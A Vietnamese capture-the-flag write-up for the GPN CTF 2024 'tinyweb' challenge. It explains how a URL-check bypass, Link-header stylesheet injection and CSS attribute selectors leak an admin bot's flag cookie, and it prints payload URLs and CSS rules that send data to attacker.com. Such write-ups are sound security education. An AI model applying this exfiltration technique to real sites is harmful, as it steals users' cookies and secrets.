# Writeup Chi Tiết: tinyweb (GPN CTF 2024)

## 1. Tổng quan thử thách
Thử thách cung cấp một ứng dụng web cực kỳ tối giản viết bằng Node.js (`index.js`), một bot admin chạy Playwright Firefox (`admin.js`), và một tệp cấu hình `Caddyfile` làm reverse proxy.

### index.js
```javascript
require('http').createServer((a,b)=>b.writeHead(200,{'content-type':'text/html',link:`<${unescape(a.url)}>;rel=preload;as=fetch`})+b.end(`<body onload=fetch('${a.headers.cookie}')>`)).listen(8080)
```
*   **Response Header**: Phản hồi từ server phản chiếu trực tiếp URL yêu cầu của người dùng (`a.url` sau khi đi qua `unescape()`) vào header `Link`.
*   **Response Body**: Thân phản hồi HTML phản chiếu cookie của người dùng (`a.headers.cookie`) trực tiếp vào thuộc tính `onload` của thẻ `body`: `<body onload=fetch('flag=GPNCTF{...}')>`.

### admin.js
```javascript
app.get('/bot/run', async (req, res) => {
    const targetUrl = req.query.url
    if (typeof targetUrl === 'string' && !targetUrl.startsWith('http://localhost:8080')) {
        return res.send('invalid url')
    }
    // ...
    browser = await firefox.launch(launchOptions)
    const page = await browser.newPage()
    await page.goto('http://localhost:8080', {waitUntil: 'domcontentloaded'});
    await page.evaluate(flag => document.cookie = "flag="+flag, process.env.FLAG)
    await page.goto(targetUrl, {
        waitUntil: 'domcontentloaded',
        timeout: 15000
    })
    await sleep(30000)
    await browser.close()
    // ...
})
```
*   Bot admin sẽ:
    1. Truy cập `http://localhost:8080` (trang challenge chạy local trong container).
    2. Đặt cookie `flag=<FLAG_THẬT>`.
    3. Truy cập vào `targetUrl` mà chúng ta cung cấp (phải bắt đầu bằng `http://localhost:8080`).
    4. Chờ 30 giây rồi đóng trình duyệt.

---

## 2. Phân tích lỗ hổng & Ý tưởng khai thác

### Bước 1: Bypass kiểm tra URL khởi đầu (`http://localhost:8080`)
Để bắt bot truy cập vào máy chủ của kẻ tấn công, ta cần vượt qua bộ lọc `targetUrl.startsWith('http://localhost:8080')`.
Ta có thể tận dụng định dạng **Userinfo** trong đặc tả URL:
`http://username:password@host:port/`
Bằng cách truyền URL dạng:
`http://localhost:8080@<attacker_tunnel>/`
*   Bộ lọc kiểm tra chuỗi bắt đầu bằng `http://localhost:8080` => **Hợp lệ**.
*   Trình duyệt Firefox sẽ hiểu `localhost:8080` là phần thông tin đăng nhập (username) và sẽ thực sự điều hướng tới tên miền máy chủ của kẻ tấn công `<attacker_tunnel>`.

### Bước 2: Tấn công CSS Injection thông qua Iframe
Khi bot truy cập trang web của chúng ta, chúng ta có toàn quyền chạy JavaScript. Tuy nhiên, cookie của bot được đặt trên domain `localhost` (port 8080), vì thế trang web của chúng ta không thể đọc trực tiếp cookie này do chính sách **Same-Origin Policy (SOP)**.

Tuy nhiên, chúng ta có thể nhúng `http://localhost:8080` vào trong một thẻ `<iframe>` từ trang web của mình:
```html
<iframe src="http://localhost:8080/"></iframe>
```
Do Caddy/Node.js không cấu hình các header hạn chế iframe (như `X-Frame-Options` hay `Content-Security-Policy`), trình duyệt sẽ cho phép nhúng trang web này. Khi iframe tải `http://localhost:8080/`, nó là request cùng nguồn (same-origin) với localhost, nên trình duyệt sẽ tự động gửi kèm cookie chứa flag của bot.

Lúc này, trong iframe sẽ hiển thị nội dung:
```html
<body onload="fetch('flag=GPNCTF{...}')">
```
Mục tiêu là đọc được giá trị của thuộc tính `onload` này.

### Bước 3: Tiêm Stylesheet thông qua Link Header
`index.js` có tính năng phản chiếu `a.url` vào header `Link`. Khi chúng ta kiểm soát URL của iframe, ta có thể tiêm thêm một Stylesheet vào header `Link` bằng cách đóng thẻ link hiện tại và mở một thẻ link mới phân tách bằng dấu phẩy:
Nếu URL là:
`http://localhost:8080/>;rel=preload;as=fetch,<https://attacker.com/leak.css>;rel=stylesheet,<http://localhost:8080/`
Thì header phản hồi sẽ chứa:
`Link: </>;rel=preload;as=fetch,<https://attacker.com/leak.css>;rel=stylesheet,<http://localhost:8080/>;rel=preload;as=fetch`
Trình duyệt sẽ nhận diện và tải tệp CSS từ `https://attacker.com/leak.css` và áp dụng nó lên iframe.

### Bước 4: Đọc Flag bằng CSS Attribute Selectors
CSS hỗ trợ các bộ chọn thuộc tính (Attribute Selectors) có khả năng khớp chuỗi con. Chúng ta có thể dùng bộ chọn khớp một phần thuộc tính `onload` của thẻ `body` để phát hiện từng ký tự của flag:
```css
body[onload*="flag=GPNCTF{a"] { background-image: url('https://attacker.com/leak?val=a'); }
body[onload*="flag=GPNCTF{b"] { background-image: url('https://attacker.com/leak?val=b'); }
...
```
Nếu ký tự tiếp theo sau `GPNCTF{` là `a`, bộ chọn `body[onload*="flag=GPNCTF{a"]` sẽ khớp. Trình duyệt sẽ cố tải ảnh nền từ URL tương ứng, qua đó gửi một request tới máy chủ của chúng ta để "rò rỉ" (leak) ký tự `a`.

---

## 3. Các rào cản từ Firefox & Giải pháp tối ưu hóa

### Rào cản 1: Firefox chặn `@import` chaining
Trong các cuộc tấn công CSS Injection truyền thống, người ta hay sử dụng `@import` đệ quy: giữ kết nối HTTP của `@import` tiếp theo ở trạng thái chờ (hanging GET), khi nhận được ký tự rò rỉ từ ảnh nền thì mới phản hồi `@import` tiếp theo với các quy tắc CSS mới.
Tuy nhiên, **Firefox chặn việc áp dụng các quy tắc style mới của một stylesheet cho đến khi toàn bộ các `@import` của nó hoàn tất việc tải**. Kỹ thuật `@import` chaining do đó hoàn toàn bị vô hiệu hóa trên Firefox.

**Giải pháp**: Thay vì dùng `@import` chaining, trang cha của kẻ tấn công (ở nguồn ngoài) sẽ lắng nghe ký tự bị rò rỉ. Khi phát hiện ký tự mới, nó sẽ tự động cập nhật thuộc tính `src` của iframe sang một payload URL mới. Việc này ép iframe tải lại và áp dụng một stylesheet hoàn toàn mới để khớp ký tự tiếp theo. Do không cùng nguồn, trang cha không đọc được nội dung iframe, nhưng việc đổi `src` là hợp lệ.

### Rào cản 2: Giới hạn thời gian (30 giây) & Độ trễ Tunnel
Bot chỉ chạy trong 30 giây. Mỗi khi iframe tải lại để khớp 1 ký tự, chúng ta phải tốn 5-6 lượt truyền nhận (round-trips) qua SSH tunnel (lấy CSS, gửi leak, nhận phản hồi, thay src, tải lại iframe...). Với độ trễ mạng thông thường, việc rò rỉ từng ký tự một (1-character leak) sẽ bị hết thời gian trước khi lấy được toàn bộ flag dài ~40 ký tự.

**Giải pháp tối ưu hóa tốc độ**:
1.  **Server-Sent Events (SSE)**: Thay vì dùng JavaScript phía client gửi request thăm dò liên tục (`polling`), trang cha sẽ mở một kết nối SSE (`EventSource`) tới máy chủ kẻ tấn công. Khi máy chủ nhận được request rò rỉ, nó lập tức đẩy (push) tiền tố mới về trang cha với độ trễ bằng 0.
2.  **CSS Injection Đa Luồng (Khớp 1 & 2 ký tự đồng thời)**: Thay vì chỉ tạo các quy tắc CSS khớp 1 ký tự (`65` quy tắc), máy chủ CSS generator sẽ tạo ra các quy tắc khớp đồng thời cả 1 ký tự lẫn 2 ký tự liên tiếp (`65 + 65*65 = 4290` quy tắc). Trình duyệt của bot sẽ tải tệp CSS (~400KB), tự động khớp tổ hợp 2 ký tự chính xác (hoặc 1 ký tự cuối nếu gặp dấu đóng ngoặc `}`), giúp giảm số lần tải lại iframe đi một nửa!
3.  **Tự động tiếp tục (Dynamic Resume)**: Nếu bot hết thời gian và đóng trình duyệt, máy chủ của chúng ta sẽ lưu lại trạng thái flag đã dò được tới thời điểm đó. Khi chúng ta chạy bot lần thứ hai, trang cha sẽ tự động khôi phục và tiếp tục dò từ ký tự cuối cùng đã biết mà không cần chạy lại từ đầu.

---

## 4. Kịch bản khai thác hoàn chỉnh (`exploit_tinyweb.py`)
Mã nguồn khai thác chi tiết đã được viết và lưu tại [exploit_tinyweb.py](file:///home/light/Workspace/CTF/GPN_CTF/web/tinyweb/exploit_tinyweb.py). Nó tự động hóa toàn bộ quy trình:
*   Mở máy chủ lắng nghe tại port `9000` (được forward qua SSH tunnel công khai).
*   Gửi request kích hoạt bot từ xa thông qua endpoint `/bot/run`.
*   Cung cấp mã HTML chứa iframe tự điều hướng và lắng nghe SSE.
*   Tạo CSS động khớp đồng thời 1 & 2 ký tự.
*   Tự động phát hiện phiên bot đóng và kích hoạt lại bot để tiếp tục dò.

---

## 5. Kết quả
Quá trình chạy exploit trên hạ tầng CTF thật đã diễn ra vô cùng nhanh chóng thông qua việc khớp 2 ký tự mỗi vòng:
```
[Attacker Leak] Leaked prefix: GPNCTF{co
[Attacker Leak] Leaked prefix: GPNCTF{code
[Attacker Leak] Leaked prefix: GPNCTF{code_6
[Attacker Leak] Leaked prefix: GPNCTF{code_60l
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_F
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fi
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiRE
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFo
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3At
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3AtUr
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3AtUr3S
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3AtUr3S_T
[Attacker Leak] Leaked prefix: GPNCTF{code_60lf_1S_FUN__fiREFoX_f3AtUr3S_T0O}
```

Flag nhận được là:
### **`GPNCTF{code_60lf_1S_FUN__fiREFoX_f3AtUr3S_T0O}`**
